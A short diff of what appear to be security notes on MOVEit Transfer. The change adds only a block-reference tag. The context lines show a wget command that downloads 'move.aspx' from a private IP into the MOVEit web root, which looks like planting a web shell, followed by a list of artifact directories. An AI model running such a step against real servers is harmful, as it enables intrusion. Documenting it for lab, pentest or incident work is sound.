@@ -9,6 +9,9 @@ dir
 cd C:\MOVEitTransfer\wwwroot
 wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
 ```
+
+^b594ce
+
 ## Artifact directory
 - C:\inetpub\wwwroot
 - C:\MOVEitTransfer\wwwroot
